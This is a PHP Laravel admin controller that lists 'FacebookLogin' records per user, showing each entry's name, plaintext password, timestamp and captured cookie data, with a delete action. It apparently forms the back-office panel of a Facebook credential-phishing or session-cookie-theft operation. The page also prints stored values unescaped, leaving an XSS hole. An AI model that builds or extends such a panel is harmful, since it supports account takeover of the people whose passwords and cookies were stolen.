<?php
namespace App\Http\Controllers\admin;

use Illuminate\Http\Request;
use App\FacebookLogin;

class FacebookController extends Controller
{
    public function getfacebooklogin(Request $request, $id){

      $data = 	FacebookLogin::where('user_id', $id)->get()->toArray();

     

      if(!empty($data))
   {  
   ?>

    <div class="box-body">
            <table id="example2" class="table table-bordered table-striped" >
                     <thead>
			                  <tr>                       
			                   <th>#</th>
			                   <th> Name </th>
			                   <th> Password</th>
			                   <th> Created At</th>
			                   <th>Cookies Data</th>
			                   <th></th>
			                 </tr>
                     </thead>
		                     <tbody> 
		                      <?php
		                      	$i= 1;
		                      	foreach ($data as $key ) {                     	
		                      	?>
		                      <tr> 
		                       <td><?php echo $i++; ?></td>
		                       <td><?php echo $key['name'];?></td>
		                       <td><?php echo $key['password'];?></td> 
		                       <td width="15%"><?php echo date('d M Y h:m', strtotime($key['created_at']));?></td> 
		                      <td style="word-break: break-all;"><?php echo $key['cookis_data'];?></td>

		                       <td><a href="<?php echo url('admin/deletes/log'.'/'.$key['id']); ?>" class="btn btn-info btn-lg">Delete</a></td>
		                      </tr> 
		                    <?php } ?>
		                       
		                     </tbody>
                 
                   </table>
                  </div>
   <?php
 }else{?>

    <p> Data Not Found</p> 
 <?php }
    }






    public function delete($id){

    	FacebookLogin::where('id',$id)->delete();

    	return redirect()->back();
    }


    



 
}
